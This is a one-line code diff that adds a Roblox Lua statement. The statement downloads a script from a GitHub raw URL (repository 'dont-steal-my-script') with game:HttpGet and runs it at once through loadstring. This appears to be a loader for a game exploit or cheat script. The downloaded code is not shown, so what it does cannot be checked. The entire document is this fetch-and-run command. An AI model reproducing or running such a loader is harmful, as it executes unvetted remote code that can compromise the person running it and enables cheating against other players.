@@ -1,0 +1,1 @@
+loadstring(game:HttpGet('https://raw.githubusercontent.com/b5yieee/dont-steal-my-script/main/mama'))()
